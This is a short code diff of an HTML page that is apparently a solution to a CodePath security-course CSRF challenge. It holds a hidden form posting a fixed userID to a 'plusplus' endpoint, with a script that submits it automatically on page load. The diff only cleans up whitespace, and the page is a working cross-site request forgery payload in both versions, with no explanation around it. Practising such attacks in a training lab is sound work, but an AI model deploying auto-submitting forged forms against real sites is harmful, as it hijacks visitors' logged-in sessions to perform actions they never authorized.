@@ -1,7 +1,5 @@
-<form name="csrfForm" action="http://www.security.codepath.com/user/csrfchallengetwo/plusplus " method="POST">
-<input type="hidden" name="userID" value=" c82e0340e3296c0b6296f96042f2f7e25134e44a " />
+<form name="csrfForm" action="http://www.security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
+<input type="hidden" name="userID" value="c82e0340e3296c0b6296f96042f2f7e25134e44a" />
 <input type="submit"/>
 </form>
-<script>
- document.csrfForm.submit();
-</script>
+<script> document.csrfForm.submit(); </script>
